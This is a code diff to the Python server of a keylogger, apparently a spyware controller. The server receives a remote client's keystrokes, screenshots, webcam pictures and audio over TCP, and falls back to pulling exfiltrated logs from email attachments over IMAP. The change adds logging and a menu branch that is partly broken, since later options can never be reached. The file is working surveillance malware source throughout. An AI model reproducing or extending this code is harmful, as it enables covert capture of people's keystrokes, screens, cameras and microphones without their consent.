@@ -4,6 +4,8 @@ from datetime import datetime
 from utils import write_file
 from GUI import GUIWindow
 import imaplib, email
+import logging
+import logging.config
 
 
 stop_threads = False
@@ -17,6 +19,10 @@ elif sys_name == 'linux' or sys_name == 'darwin':
 else:
 	print("Unknown system!\nExiting...")
 	sys.exit(1)
+
+
+logging.config.fileConfig('logging.conf')
+logger = logging.getLogger('action')
 
 
 class Server:
@@ -112,30 +118,33 @@ class KeyLogger(threading.Thread):
 				# data process
 				if data[0] == "image":
 					if data[2] == 'Error':
-						print("Error with taking screenshot!")
+						logger.info("Error with taking screenshot!")
 					else:
 						with open(f'./screenshot_{data[1]}.png', 'wb') as handler:
 							handler.write(data[2])
+						logger.info('Done')
 				elif data[0] == "char":
 					write_file(os.path.join(path, filename), data[1:])
 					if gui_running:
 						self.gui.insert_data(data[1:])
 				elif data[0] == "wcpic":
 					if data[2] == 'Error':
-						print("Error with taking webcam picture!")
+						logger.info("Error with taking webcam picture!")
 					else:
 						with open(f'./webcam_{data[1]}.png', 'wb') as handler:
 							handler.write(data[2])
+						logger.info('Done')
 				elif data[0] == 'audio':
 					if data[2] == 'Error':
-						print("Error with recording audio!")
+						logger.info("Error with recording audio!")
 					else:
 						with open(f'./audio_{data[1]}.wav', 'wb') as handler:
 							handler.write(data[2])
+						logger.info('Done')
 			except:
 				stop_threads = True
 				self.connection.client.close()
-				print("\nClient closed the TCP connection.\nFrom now on communication will be via email if the process was not killed.\n")
+				logger.info("\nClient closed the TCP connection.\nFrom now on communication will be via email if the process was not killed.\n")
 				break
 
 		stop_threads = True
@@ -156,21 +165,27 @@ class KeyLogger(threading.Thread):
 						if email.message_from_string(data[0][1].decode())['from'] == email_address:
 							raw_message = email.message_from_bytes(data[0][1])
 
+							logger.info('Downloading email attachments...')
 							get_attachments(raw_message)
+							logger.info('Done')
 
 							if os.path.isfile(os.path.join(temp_path, filename)):
 								with open(os.path.join(temp_path, filename), 'r') as reader:
 									with open("../logs/log.csv", "a+") as writer:
+										logger.info('Writing data into file...')
 										for line in reader.readlines():
 											writer.write(line)
 											if gui_running:
 												self.gui.insert_data(line.split(','))
+										logger.info('Done')
 
 							if os.path.isfile(os.path.join(temp_path, "screenshot.png")):
 								date_time = datetime.now().strftime("%d_%H_%M_%S")
+								logger.info('Moving the screenshot into current folder...')
 								shutil.move(os.path.join(temp_path, "screenshot.png"), f"./screenshot_{date_time}.png")
+								logger.info('Done\n')
 			except:
-				print("Something went wrong with email processing!")
+				logger.info("Something went wrong with email processing!")
 				break
 
 
@@ -191,6 +206,19 @@ class MenuHandler(threading.Thread):
 			if option.lower() == 'help':
 				print("1) Take screenshot\n2) Webcam picture\n3) Record audio\n4) Exit\n")
 			elif option == '1' or option == '2' or option == '3':
+				logger.info('Taking screenshot...')
+				try:
+					self.connection.client.sendall(option.encode('utf-8'))
+				except:
+					break
+			elif option == '2':
+				logger.info('Taking webcam picture...')
+				try:
+					self.connection.client.sendall(option.encode('utf-8'))
+				except:
+					break
+			elif option == '3':
+				logger.info('Recording audio...')
 				try:
 					self.connection.client.sendall(option.encode('utf-8'))
 				except:
@@ -198,6 +226,7 @@ class MenuHandler(threading.Thread):
 			elif option == '':
 				pass
 			elif option == '4' or stop_threads:
+				logger.info('Exit')
 				break
 			else:
 				print("Wrong option!\n")
@@ -208,10 +237,12 @@ def main():
 
 	server = Server(ip_address='', port=10001)
 	try:
+		logger.info('Waitiog for connection...')
 		server.connect()
 	except socket.error:
 		print(socket.error)
-		sys.exit()
+		sys.exit(1)
+	logger.info('Client connected!')
 
 	gui = GUIWindow("KeyStrokeLogger")
 
